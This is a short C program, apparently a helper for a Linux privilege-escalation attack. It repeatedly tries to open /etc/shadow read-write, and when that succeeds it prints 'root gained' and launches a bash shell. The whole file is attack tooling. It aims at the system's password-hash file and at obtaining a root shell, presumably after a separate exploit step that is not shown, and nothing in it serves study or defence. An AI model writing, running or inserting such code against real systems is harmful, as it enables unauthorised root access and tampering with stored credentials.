#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
	for(;;) {
		if(open("/etc/shadow", O_RDWR) >= 0) {
			printf("root gained\n");
			system("bash");
			return 1;
		}
		perror("open(/etc/shadow) = ");
		usleep(100 * 1000);
	}
}
